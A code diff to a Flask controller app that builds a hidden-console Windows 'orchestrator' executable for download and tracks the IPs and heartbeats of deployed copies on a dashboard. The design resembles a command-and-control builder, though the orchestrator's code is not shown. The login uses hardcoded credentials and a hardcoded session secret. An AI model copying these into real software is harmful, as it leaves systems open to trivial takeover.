@@ -1,28 +1,31 @@
-# controller/app.py
-from flask import Flask, render_template, request, redirect, url_for, session, send_file
+from flask import Flask, render_template, request, redirect, url_for, session, send_file, jsonify
 import os
 import subprocess
 import threading
 import datetime
 import shutil
+import zipfile
 
 app = Flask(__name__)
 app.secret_key = 'supersecret'
 
-orchestrators = {}
+# Hardcoded Dummy User Credentials
+DUMMY_USERNAME = "admin"
+DUMMY_PASSWORD = "password123"
 
-def validate_token(token):
-    return token == "dummy_valid_token"
+# Dictionary to store orchestrator heartbeats
+orchestrators = {}
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        token = request.form['token']
-        if validate_token(token):
+        username = request.form['username']
+        password = request.form['password']
+        if username == DUMMY_USERNAME and password == DUMMY_PASSWORD:
             session['user'] = 'authenticated'
             return redirect(url_for('home'))
         else:
-            return "Login failed."
+            return "Login failed. Invalid credentials."
     return render_template('index.html')
 
 @app.route('/home', methods=['GET', 'POST'])
@@ -31,7 +34,8 @@ def home():
         return redirect(url_for('login'))
     return '''
     <h1>I'm Alive - Controller</h1>
-    <form action="/generate" method="post">
+    <a href="/dashboard" class="btn btn-primary">Go to Dashboard</a>
+    <form action="/generate" method="post" style="margin-top: 20px;">
         <button type="submit">Generate & Download Orchestrator</button>
     </form>
     '''
@@ -43,10 +47,7 @@ def generate():
 
     create_orchestrator_executable()
 
-    file_path = './orchestrator_dist/orchestrator_build'
-    if os.name == 'nt':  # If Windows, add .exe
-        file_path += '.exe'
-
+    file_path = './orchestrator_dist/orchestrator_build.zip'
     return send_file(file_path, as_attachment=True)
 
 @app.route('/heartbeat', methods=['POST'])
@@ -55,7 +56,32 @@ def heartbeat():
     orch_id = data.get('id')
     ip = request.remote_addr
     orchestrators[orch_id] = (ip, datetime.datetime.now())
+    print(f"[Heartbeat] Received from {orch_id} @ {ip} at {datetime.datetime.now()}")
     return {"status": "received"}
+
+@app.route('/dashboard')
+def dashboard():
+    if 'user' not in session:
+        return redirect(url_for('login'))
+    return render_template('dashboard.html')
+
+@app.route('/api/heartbeat_status')
+def heartbeat_status():
+    if 'user' not in session:
+        return jsonify({})
+    
+    data = []
+    now = datetime.datetime.now()
+
+    for orch_id, (ip, last_seen) in orchestrators.items():
+        status = "Online" if (now - last_seen).seconds <= 120 else "Offline"
+        data.append({
+            "id": orch_id,
+            "ip": ip,
+            "last_seen": last_seen.strftime('%Y-%m-%d %H:%M:%S'),
+            "status": status
+        })
+    return jsonify(data)
 
 def monitor_heartbeats():
     while True:
@@ -66,13 +92,37 @@ def monitor_heartbeats():
         threading.Event().wait(60)
 
 def create_orchestrator_executable():
-    shutil.copyfile('./orchestrator_template/orchestrator.py', './orchestrator_template/orchestrator_build.py')
+    os.makedirs("./orchestrator_dist", exist_ok=True)
+
+    shutil.copyfile('./orchestrator-template/orchestrator.py', './orchestrator-template/orchestrator_build.py')
+
     subprocess.run([
         "pyinstaller",
         "--onefile",
         "--distpath", "./orchestrator_dist",
-        "./orchestrator_template/orchestrator_build.py"
-    ])
+        "--clean",
+        "--name", "orchestrator_build",
+        "--noconsole",
+        "./orchestrator-template/orchestrator_build.py"
+    ], env={
+        **os.environ,
+        "WINEARCH": "win32",
+        "WINEPREFIX": "/root/.wine"
+    })
+
+    # Always package the .exe file
+    build_path = "./orchestrator_dist/orchestrator_build.exe"
+    zip_path = "./orchestrator_dist/orchestrator_build.zip"
+
+    if not os.path.exists(build_path):
+        raise FileNotFoundError("Windows executable not found!")
+
+    # Create zip
+    with zipfile.ZipFile(zip_path, 'w') as zipf:
+        zipf.write(build_path, arcname="orchestrator_build.exe")
+
+    print(f"[INFO] Successfully created zipped orchestrator at {zip_path}")
+
 
 if __name__ == '__main__':
     threading.Thread(target=monitor_heartbeats, daemon=True).start()
